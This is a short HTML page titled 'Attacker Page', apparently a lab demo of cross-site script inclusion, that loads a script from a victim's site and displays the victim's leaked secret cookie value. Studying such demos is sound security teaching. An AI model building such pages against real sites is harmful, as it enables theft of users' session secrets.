<!DOCTYPE html>
<html lang="en">
<head>
    <title>Attacker Page</title>
</head>
<body>
    <script src="static/cookie-script.js"></script>  // JavaScript Code imported from Victim's Website 

    <div id="result" class="mt-3">
        <h2 class="text-center">Leaked Data</h2>
        <div class="alert alert-success text-center" role="alert">
            Your secret cookie: <b id="cookieValue"></b>
        </div>
    </div>

    <script>
        var div = document.getElementById("cookieValue");   // Attacker's Page accessed the cookie value from Victim's Website
        div.innerHTML = window.cookieValue;
    </script>
</body>
</html>